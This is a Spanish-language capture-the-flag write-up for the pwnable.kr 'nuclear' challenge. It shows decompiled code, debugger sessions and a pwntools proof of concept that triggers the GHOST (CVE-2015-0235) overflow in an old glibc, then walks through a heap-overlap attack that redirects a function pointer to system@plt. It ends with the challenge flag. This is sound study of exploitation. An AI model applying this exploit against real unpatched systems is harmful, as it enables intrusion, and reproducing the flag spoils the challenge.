# nuclear

![img](https://raw.githubusercontent.com/Calana2/Wargame_Writeups/refs/heads/main/pwnable.kr/Hackers_Secret/nuclear.png)

## Introduccón
El programa resuelve un dominio y llama a `system` para hacerle `ping`:
```C
char * nuke(char *url)

{
  long i;
  long in_FS_OFFSET;
  byte zero;
  hostent ret;
  hostent *result;
  char *local_b0;
  in_addr_t ip;
  int h_errornop;
  char cmd [136];
  long canary;
  char *cmd_ptr;
  
  zero = 0;
  canary = *(long *)(in_FS_OFFSET + 0x28);
  gethostbyname_r(url,&ret,g_buf,0x404,&result,&h_er rornop);
  if (result == (hostent *)0x0) {
    puts("invalid url");
    cmd_ptr = (char *)0x0;
  }
  else {
    printf("launch nuke for %s\n",result->h_name);
    while (cmd_ptr = *result->h_addr_list, cmd_ptr != (ch ar *)0x0) {
      local_b0 = *result->h_addr_list;
      ip = (in_addr_t)*(undefined8 *)local_b0;
      cmd_ptr = cmd;
      for (i = 16; i != 0; i = i + -1) {
        cmd_ptr[0] = '\0';
        cmd_ptr[1] = '\0';
        cmd_ptr[2] = '\0';
        cmd_ptr[3] = '\0';
        cmd_ptr[4] = '\0';
        cmd_ptr[5] = '\0';
        cmd_ptr[6] = '\0';
        cmd_ptr[7] = '\0';
        cmd_ptr = cmd_ptr + ((ulong)zero * -2 + 1) * 8;
      }
      cmd_ptr = inet_ntoa((in_addr)ip);
      sprintf(cmd,"ping -w 1 -c 1 %s\n",cmd_ptr);
      system(cmd);
      result->h_addr_list = result->h_addr_list + 1;
    }
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return * /
    __stack_chk_fail();
  }
  return cmd_ptr;
}
```

El programa falla al cargar la libreria 'libnss_files.so' para resolver un nombre de dominio, por lo que hay que usar IPs directamente.

```
pwndbg> bt
#0  0x00007f176c00fb70 in ?? () from ./ld-linux-x86-64.so.1
#1  0x00007f176c01337f in ?? () from ./ld-linux-x86-64.so.1
#2  0x00007f176bd30d42 in ?? () from ./zzzz.so.5
#3  0x00007f176c00f136 in ?? () from ./ld-linux-x86-64.so.1
#4  0x00007f176bd30e04 in __libc_dlopen_mode () from ./zzzz.so.5
#5  0x00007f176bd0615e in ?? () from ./zzzz.so.5
#6  0x00007f176bd06bbd in __nss_lookup_function () from ./zzzz.so.5
#7  0x00007f176bd06dcc in __nss_lookup () from ./zzzz.so.5
#8  0x00007f176bd0dc48 in gethostbyname_r () from ./zzzz.so.5
#9  0x0000000000400ab2 in ?? ()
#10 0x00007ffe01f74c60 in ?? ()
#11 0x00007ffe01f74450 in ?? ()
#12 0x000057806c2aa500 in ?? ()
#13 0x0000003000000008 in ?? ()
#14 0x00007ffe01f74440 in ?? ()
#15 0x00007ffe01f74380 in ?? ()
#16 0x0000000000000000 in ?? ()
pwndbg> pd 1
 ► 0x7f176c00fb70    mov    dword ptr [rax], 1     [0x7f176c222f88] <= 1
   0x7f176c00fb76    jne    0x7f176c00fb2b              <0x7f176c00fb2b>

   0x7f176c00fb78    mov    rdx, qword ptr [rip + 0x213449]     RDX, [0x7f176c222fc8] => 0x7f176c2242a0 (_r_debug)
pwndbg> telescope
00:0000│ rsp 0x7ffe01f73f38 : ▸ 0x7f176c01337f ◂:  cmp dword ptr [rax + 0x18], 0
01:0008│-0a0 0x7ffe01f73f40 ◂:  0
02:0010│-098 0x7ffe01f73f48 : ▸ 0x7ffe01f74d40 : ▸ 0x7ffe01f761de ◂:  './nuclear'
03:0018│-090 0x7ffe01f73f50 : ▸ 0x7ffe01f741a0 ◂:  'libnss_files.so.2'
04:0020│-088 0x7ffe01f73f58 ◂:  0x80000001
05:0028│-080 0x7ffe01f73f60 : ▸ 0x7f176bd0615e ◂:  mov qword ptr [r14 + 8], rax
06:0030│-078 0x7ffe01f73f68 : ▸ 0x7f176bd30d42 ◂:  mov qword ptr [rbx + 0x18], rax
07:0038│-070 0x7ffe01f73f70 ◂:  0
pwndbg>
```

Aunque parecen un vector este fragmento de `nuke`, no parece funcionar, si escribimos algo distinto a una ip válida esta parte no se ejecuta:
```C
      cmd_ptr = inet_ntoa((in_addr)ip);
      sprintf(cmd,"ping -w 1 -c 1 %s\n",cmd_ptr);
      system(cmd);
```

Por otro lado, "zzzz.so.5" es una libc disfrazada, una muy vieja de hecho:
```
$ strings zzzz.so.5|grep "GNU"
GNU C Library (Ubuntu EGLIBC 2.15-0ubuntu10.5) stable release version 2.15, by Roland McGrath et al.
Compiled by GNU CC version 4.6.3.
        GNU Libidn by Simon Josefsson
```

## GHOST (CVE-2015-0235)

La función no comprueba si es una ip válida si comienza con "0", la considera localhost. De hecho con que sea un numero representado en ascii entre 0 y 2**32: 1 funciona. Los ceros a la izquierda son ignorados. 
```
give me an URL! : 0000000000000000000
launch nuke for 0000000000000000000
PING 0.0.0.0 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.063 ms

--- 0.0.0.0 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.063/0.063/0.063/0.000 ms
```

Resulta que esta versón de libc es vulnerable a GHOST (CVE-2015-0235).

Reproduje la prueba de concepto que ví en [este artículo](https://www.hackplayers.com/2015/01/ghost-cve-2015-0235-el-fantasma-de-linux.html):
```py
from pwn import *

elf = context.binary = ELF("./nuclear")
io = process("./ld-linux-x86-64.so.1 --library-path . ./nuclear",shell=True)

# /*** strlen (name) = size_needed - sizeof (*host_addr) - sizeof (*h_addr_ptrs) - 1; ***/
# size_t len = sizeof(temp.buffer) - 16*sizeof(unsigned char) - 2*sizeof(char *) - 1;
len = 0x404 - 16 * 1 - 2 * 8 - 1
payload = b"0" * len

io.sendline(b"2")
io.sendline(payload)
io.interactive()
```

```
00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
PING 0.0.0.0 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.094 ms

--- 0.0.0.0 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.094/0.094/0.094/0.000 ms

- select menu -
- 1. : help
- 2. : nuke
- 3. : exit
> $ 3
are you sure you want to exit?(y/n)*** glibc detected *** ./nuclear: malloc(): memory corruption: 0x000055556c4df420 ***
```

Perfecto, corrupción del heap. Lo modifiqué un poco y puse un watchpoint en los metadatos del chunk posterior a `g_buf`:
```py
payload = b"0" * (len - 8) + b"11112222"
# ...
io.sendline(b"2")
pause()
```

```
pwndbg> watch *0x55555dd9c410
Hardware watchpoint 1: *0x55555dd9c410
pwndbg> c
Continuing.

Hardware watchpoint 1: *0x55555dd9c410

Old value = 0
New value = 825241648
0x00007fa61bc88b44 in ?? () from ./zzzz.so.5
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────[ REGISTERS / show-flags off / show-compact-regs off ]───────
*RAX  0x3231313131303030 ('00011112')
*RBX  0x7fff91ade110 ◂:  0x3030303030303030 ('00000000')
*RCX  0
*RDX  0x55555dd9c410 ◂:  0x3231313131303030 ('00011112')
*RDI  0x55555dd9c038 ◂:  0x3030303030303030 ('00000000')
*RSI  0x7fff91ade4f0 ◂:  0x323232 /* '222' */
*R8   0xfefefefefefefeff
 R9   0
*R10  0
*R11  8
 R12  0
*R13  2
*R14  4
*R15  0xffffffffffffff98
*RBP  0x7fff91addf98 : ▸ 0x55555dd9c010 ◂:  0x92942400
*RSP  0x7fff91addee8 : ▸ 0x7fa61bd08680 (__nss_hostname_digits_dots+1136) ◂:  mov rdx, qword ptr [rsp + 0x10]
*RIP  0x7fa61bc88b44 ◂:  add rdx, 8
────────────────[ DISASM / x86-64 / set emulate on ]────────────────
 ► 0x7fa61bc88b44    add    rdx, 8     RDX => 0x55555dd9c418 (0x55555dd9c410 + 0x8)
   0x7fa61bc88b48    jmp    0x7fa61bc88ac0              <0x7fa61bc88ac0>
    ↓
   0x7fa61bc88ac0    mov    rax, qword ptr [rsi]     RAX, [0x7fff91ade4f0] => 0x323232
   0x7fa61bc88ac3    add    rsi, 8                   RSI => 0x7fff91ade4f8 (0x7fff91ade4f0 + 0x8)
   0x7fa61bc88ac7    mov    r9, rax                  R9 => 0x323232
   0x7fa61bc88aca    add    r9, r8                   R9 => 0xfefefefeff313131 (0x323232 + 0xfefefefefefefeff)
   0x7fa61bc88acd  ✔ jae    0x7fa61bc88b50              <0x7fa61bc88b50>
    ↓
   0x7fa61bc88b50    mov    byte ptr [rdx], al       [0x55555dd9c418] <= 0x32
   0x7fa61bc88b52    test   al, al                   0x32 & 0x32     EFLAGS => 0x202 [ cf pf af zf sf IF df of ac ]
   0x7fa61bc88b54  ✘ je     0x7fa61bc88b68              <0x7fa61bc88b68>

   0x7fa61bc88b56    inc    rdx                      RDX => 0x55555dd9c419
─────────────────────────────[ STACK ]──────────────────────────────
00:0000│ rsp 0x7fff91addee8 : ▸ 0x7fa61bd08680 (__nss_hostname_digits_dots+1136) ◂:  mov rdx, qword ptr [rsp + 0x10]
01:0008│-0a8 0x7fff91addef0 : ▸ 0x55555dd9c010 ◂:  0x92942400
02:0010│-0a0 0x7fff91addef8 : ▸ 0x7fa61c3bc500 : ▸ 0x7fa61bc00000 ◂:  jg 0x7fa61bc00047
03:0018│-098 0x7fff91addf00 : ▸ 0x7fff91ade020 ◂:  0x57801c3bc500
04:0020│-090 0x7fff91addf08 : ▸ 0x7fff91ade040 ◂:  0
05:0028│-088 0x7fff91addf10 ◂:  0x404
06:0030│-080 0x7fff91addf18 : ▸ 0x55555dd9c030 ◂:  0
07:0038│-078 0x7fff91addf20 ◂:  0xffffffff
───────────────────────────[ BACKTRACE ]────────────────────────────
 ► 0   0x7fa61bc88b44 None
   1   0x7fa61bd08680 __nss_hostname_digits_dots+1136
   2   0x7fa61bd0d9e4 gethostbyname_r+84
   3         0x400ab2 None
   4   0x7fff91ade920 None
   5   0x7fff91ade110 None
   6   0x57801c3bc500 None
   7     0x3000000008 None
────────────────────────────────────────────────────────────────────
pwndbg> pd 1
 ► 0x7fa61bc88b44    add    rdx, 8     RDX => 0x55555dd9c410 + 0x8
   0x7fa61bc88b48    jmp    0x7fa61bc88ac0              <0x7fa61bc88ac0>

   0x7fa61bc88b4d    nop    dword ptr [rax]
pwndbg> bt
#0  0x00007fa61bc88b44 in ?? () from ./zzzz.so.5
#1  0x00007fa61bd08680 in __nss_hostname_digits_dots () from ./zzzz.so.5
#2  0x00007fa61bd0d9e4 in gethostbyname_r () from ./zzzz.so.5
#3  0x0000000000400ab2 in ?? ()
#4  0x00007fff91ade920 in ?? ()
#5  0x00007fff91ade110 in ?? ()
#6  0x000057801c3bc500 in ?? ()
#7  0x0000003000000008 in ?? ()
#8  0x00007fff91ade100 in ?? ()
#9  0x00007fff91ade040 in ?? ()
#10 0x0000000000000000 in ?? ()
pwndbg> x/gx 0x55555dd9c410
0x55555dd9c410: 0x3231313131303030
pwndbg>
0x55555dd9c418: 0x00000000000003f1
pwndbg>
0x55555dd9c420: 0x00007fa61bfb9778
pwndbg>
0x55555dd9c428: 0x00007fa61bfb9778
```

Se sobreescribe el campo `prev_size` del chunk con los últimos bytes. Y por los punteros a `main_arena` que se pueden observar, sabemos que esta en una lista doblemente enlazada, como la *unsorted bin*.

IMAGEN

Posteriormente también me di cuenta que podemos sobreescribir el campo `size` con hasta 4 bytes.

## Explotación

El heap luce así:

|  |  |  |
|---------|-------|-------------|
| g_buf | prev_size | |
| | size | |
| | data | |
| g_buf2 (freed chunk, in unsorted bin) | prev_size | |
| | size | |
| | fd | |
| | bk | |
| ptr_array | prev_size | |
| | size | |
| | data | 'help' address |
| | data | 'nuke' address |
| | data | 'bye' address |
| | ... | |
| top_chunk | | |

La función `bye` nos permite reservar un chunk de 0x3000 bytes, si cambiamos g_buf2->size a 0x3030 o más, `malloc` al asignar memoria tomará `g_buf2` solapado con `ptr_array`, lo que nos permite sobreescribir los punteros.

```C

undefined8 bye(void)

{
  byte *input;
  long i;
  byte *pbVar1;
  undefined uVar2;
  undefined uVar3;
  byte zero;
  
  zero = 0;
  uVar2 = &stack0xfffffffffffffff8 < (undefined *)0x10;
  uVar3 = &stack0x00000000 == (undefined *)0x18;
  printf("are you sure you want to exit?(y/n)");
  input = (byte *)malloc(0x3000);
  __isoc99_scanf("%3000s",input);
  i = 2;
  pbVar1 = &y;
  do {
    if (i == 0) break;
    i = i + -1;
    uVar2 = *input < *pbVar1;
    uVar3 = *input == *pbVar1;
    input = input + (ulong)zero * -2 + 1;
    pbVar1 = pbVar1 + (ulong)zero * -2 + 1;
  } while ((bool)uVar3);
  if ((!(bool)uVar2 && !(bool)uVar3) == (bool)uVar2) {
    puts("bye");
                    /* WARNING: Subroutine does not return * /
    exit(0);
  }
  puts("good choice. don\'t give up and pwn this");
  return 0;
}
```

La función `bye` nos permite volver siempre y cuando se cumpla `uVar2 = *input < *pbVar1;` para el segundo byte de la entrada, así que con pasar un valor cualquiera < 'y'podemos regresar sin problemas. 

Sobreescribiendo el puntero a `nuke` por la entrada de `system` en la PLT y pasándole como argumento la shell obtenemos control.

Por último, la entrada se hace via `scanf`, que tiene unos caracteres malos como \x20 o \x0b, así que redirigí el flujo un poco después a `system@plt + 6`.

`Get_HOST_by_name_says_nuclear_launch_detect3d`
